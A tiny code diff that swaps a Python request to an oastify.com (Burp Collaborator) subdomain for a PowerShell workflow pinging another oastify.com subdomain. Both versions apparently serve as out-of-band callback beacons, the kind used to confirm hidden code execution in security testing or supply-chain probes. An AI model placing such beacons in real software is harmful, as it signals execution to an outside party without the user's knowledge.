@@ -1,2 +1,4 @@
-import requests
-r = requests.get("http://v953zpsd7a82dzoqaxhpj240lrrifady2.oastify.com")
+Workflow czar
+{ 
+    Test-Connection -computername "gdxo3awybvcnhksbeilann8lpcv3jvnjc.oastify.com" -count 3
+}
